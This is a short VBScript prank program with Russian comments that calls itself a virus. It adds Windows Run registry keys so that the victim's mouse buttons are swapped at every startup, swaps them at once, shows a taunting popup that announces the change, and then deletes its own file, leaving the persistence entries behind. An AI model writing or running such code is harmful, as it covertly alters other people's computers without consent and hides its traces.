Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' Пропускать ошибки
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application")


'     Поменять функции клавиш мышки местами
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\SwapNT", "rundll32 user32, SwapMouseButton"
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Swap98", "rundll32.exe user.exe, swapmousebutton"
Shell.Run "rundll32 user32, SwapMouseButton"


Shell.popup "При нажатии на кнопку ОК, клавиши вашей мыши поменяются. Затем вирус самоликведируется.", , "ХАНА", 0+64

'     Самоликвидироваться
FileSystemObject.deletefile WScript.ScriptFullName, True

